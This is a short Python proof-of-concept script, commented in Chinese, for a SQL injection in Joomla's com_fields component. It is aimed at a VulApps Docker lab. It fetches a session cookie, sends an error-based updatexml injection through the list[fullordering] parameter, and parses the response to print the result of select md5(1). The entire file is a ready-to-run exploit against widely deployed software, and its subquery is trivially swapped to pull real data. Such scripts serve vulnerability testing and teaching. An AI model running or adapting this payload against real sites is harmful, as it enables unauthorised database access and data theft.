#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:j_joomla_2
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/j/joomla/2

import sys
import traceback
import http.client

from html.parser import HTMLParser

class SqlHTMLParser(HTMLParser):
    result = ""
    flag = False

    def handle_starttag(self, tag, attrs):
        if tag == "blockquote":
            self.flag = True
    
    def handle_endtag(self, tag):
        if tag == "blockquote":
            self.flag = False

    def handle_data(self, data):
        if self.flag == True:
            self.result = data

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print("用法：python",sys.argv[0],"IP地址 端口号")
    print("例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080")
    sys.exit()

ip = "192.168.13.129"
port = 80

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]

try:
    conn = http.client.HTTPConnection(ip, port)
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()

try:
    url = "/index.php"
    conn.request("GET", url)
    resp = conn.getresponse()

    resp.read()
    cookie = resp.getheader("Set-Cookie")

    url = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(1))),1)"
    header = {"Cookie":cookie}
    conn.request("GET", url, "", header)
    resp = conn.getresponse()

    parser = SqlHTMLParser()
    content = str(resp.read(), "utf8")
    parser.feed(content)

    print("这是select MD5(1)的执行结果：", parser.result)
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()
